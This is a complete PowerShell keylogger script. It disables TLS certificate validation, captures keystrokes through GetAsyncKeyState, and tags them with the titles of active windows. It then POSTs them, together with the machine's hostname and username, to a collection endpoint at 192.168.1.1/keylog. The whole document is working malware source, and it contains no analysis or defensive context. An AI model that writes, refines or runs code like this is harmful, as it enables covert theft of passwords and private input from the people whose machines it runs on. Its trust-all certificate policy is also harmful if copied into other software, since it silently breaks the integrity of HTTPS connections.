# PowerShell Keylogger with SSL Certificate Bypass
# Target: 

# SSL Certificate Bypass - Add this BEFORE any web requests
add-type @"
    using System.Net;
    using System.Security.Cryptography.X509Certificates;
    public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
            ServicePoint srvPoint, X509Certificate certificate,
            WebRequest request, int certificateProblem) {
            return true;
        }
    }
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Keylogger API definitions
Add-Type @'
using System;
using System.Runtime.InteropServices;
using System.Text;

public class KeyLogger {
    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(Int32 i);

    [DllImport("user32.dll")]
    public static extern int GetForegroundWindow();

    [DllImport("user32.dll")]
    public static extern int GetWindowText(int hWnd, StringBuilder text, int count);
}
'@

# Configuration
$targetIP = "192.168.1.1"
$targetPort = "80"
$postURL = "http://${targetIP}:${targetPort}/keylog"  # Use HTTP explicitly
$bufferSize = 100
$sleepTime = 50

$keyBuffer = ""
$lastWindow = ""

function Get-ActiveWindowTitle {
    $handle = [KeyLogger]::GetForegroundWindow()
    $title = New-Object System.Text.StringBuilder 256
    [KeyLogger]::GetWindowText($handle, $title, 256) | Out-Null
    return $title.ToString()
}

function Send-KeylogData {
    param([string]$data)

    try {
        $body = @{
            hostname = $env:COMPUTERNAME
            username = $env:USERNAME
            timestamp = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
            keystrokes = $data
        } | ConvertTo-Json

        # Use Invoke-WebRequest with explicit parameters
        $response = Invoke-WebRequest -Uri $postURL `
            -Method POST `
            -Body $body `
            -ContentType "application/json" `
            -UseBasicParsing `
            -TimeoutSec 5 `
            -ErrorAction Stop

        Write-Host "[+] Sent $($data.Length) chars (Status: $($response.StatusCode))" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "[-] Send failed: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# Main loop
Write-Host "[*] Keylogger started. Target: $postURL" -ForegroundColor Yellow

while ($true) {
    Start-Sleep -Milliseconds $sleepTime

    $currentWindow = Get-ActiveWindowTitle
    if ($currentWindow -ne $lastWindow -and $currentWindow -ne "") {
        $keyBuffer += "`n[Window: $currentWindow]`n"
        $lastWindow = $currentWindow
    }

    for ($key = 8; $key -le 190; $key++) {
        $keyState = [KeyLogger]::GetAsyncKeyState($key)

        if ($keyState -eq -32767) {
            $char = switch ($key) {
                8  { "[BKSP]" }
                9  { "[TAB]" }
                13 { "[ENTER]`n" }
                16 { "" }
                17 { "" }
                18 { "" }
                20 { "[CAPS]" }
                27 { "[ESC]" }
                32 { " " }
                46 { "[DEL]" }
                default {
                    if ($key -ge 48 -and $key -le 90) { [char]$key }
                    else { "" }
                }
            }

            if ($char -ne "") {
                $keyBuffer += $char
                Write-Host -NoNewline $char
            }
        }
    }

    if ($keyBuffer.Length -ge $bufferSize) {
        Send-KeylogData -data $keyBuffer
        $keyBuffer = ""
    }
}
